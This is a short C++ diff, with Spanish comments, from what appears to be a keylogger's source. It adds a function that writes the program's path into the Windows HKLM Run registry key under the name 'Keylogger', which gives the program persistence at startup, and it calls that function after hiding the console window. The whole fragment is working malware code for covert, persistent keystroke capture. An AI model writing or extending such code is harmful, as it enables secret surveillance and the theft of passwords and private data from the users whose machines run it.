@@ -6,6 +6,20 @@
 
 using namespace std;
 
+void crearKey(char *ruta){	//Autoarranque
+	
+	int regKey;
+	HKEY hkey;
+	
+	regKey = RegCreateKey(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);
+	
+	if(regKey == 0){
+		
+		RegSetValueEx((HKEY)hkey, "Keylogger", 0, REG_SZ, (BYTE*)ruta, strlen(ruta));
+		
+	}
+}
+
 int main(int argc, char *argv[]){
 
 	//ascii	
@@ -112,6 +126,8 @@ int main(int argc, char *argv[]){
     
     HWND hwnd = GetConsoleWindow();
     ShowWindow(hwnd, 0);	//Ocultar consola
+    
+    crearKey(argv[0]);
 	
 	while(true){
 		
